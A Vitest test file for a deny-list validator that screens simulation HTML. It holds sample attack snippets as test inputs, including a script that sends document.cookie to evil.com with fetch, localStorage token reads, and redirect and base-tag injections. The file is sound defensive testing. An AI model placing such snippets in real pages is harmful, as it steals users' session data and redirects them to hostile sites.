import { describe, expect, it } from "vitest"
import { validateSimulationCode } from "./simulationDoc"

// Ported from SimulationPanel.test.tsx when the floating panel was removed: these test the deny-list, which is independent of the panel.
describe("simulationDoc", () => {
  describe("validateSimulationCode", () => {
    it("approves safe simulation code with canvas and mathjax", () => {
      const safeCode = `
        <div class="p-4">
          <canvas id="simCanvas" width="400" height="300"></canvas>
          <p>Gravitational acceleration: $g = 9.8 \\text{ m/s}^2$</p>
          <script>
            const ctx = document.getElementById('simCanvas').getContext('2d');
            ctx.fillStyle = '#0f766e';
            ctx.fillRect(10, 10, 50, 50);
          </script>
        </div>
      `
      const res = validateSimulationCode(safeCode)
      expect(res.safe).toBe(true)
      expect(res.violations).toHaveLength(0)
    })

    it("blocks window.parent access attempts", () => {
      const malicious = `<script>const p = window.parent; p.postMessage('exfil', '*');</script>`
      const res = validateSimulationCode(malicious)
      expect(res.safe).toBe(false)
      expect(res.violations).toContain("window.parent access")
    })

    it("blocks window.top access attempts", () => {
      const malicious = `<script>window.top.location = 'https://evil.com';</script>`
      const res = validateSimulationCode(malicious)
      expect(res.safe).toBe(false)
      expect(res.violations).toContain("window.top access")
    })

    it("blocks document.cookie access attempts", () => {
      const malicious = `<script>const c = document.cookie; fetch('https://evil.com/?c=' + c);</script>`
      const res = validateSimulationCode(malicious)
      expect(res.safe).toBe(false)
      expect(res.violations).toContain("document.cookie access")
    })

    it("blocks localStorage and sessionStorage access", () => {
      const malicious = `<script>const token = localStorage.getItem('token');</script>`
      const res = validateSimulationCode(malicious)
      expect(res.safe).toBe(false)
      expect(res.violations).toContain("localStorage access")

      const sessionMal = `<script>const s = sessionStorage.getItem('auth');</script>`
      const resSession = validateSimulationCode(sessionMal)
      expect(resSession.safe).toBe(false)
      expect(resSession.violations).toContain("sessionStorage access")
    })

    it("blocks meta refresh redirect attempts", () => {
      const malicious = `<meta http-equiv="refresh" content="0;url=https://evil.com">`
      const res = validateSimulationCode(malicious)
      expect(res.safe).toBe(false)
      expect(res.violations).toContain("meta refresh redirect")
    })

    it("blocks base tag injection", () => {
      const malicious = `<base href="https://evil.com/">`
      const res = validateSimulationCode(malicious)
      expect(res.safe).toBe(false)
      expect(res.violations).toContain("base tag injection")
    })
  })
})
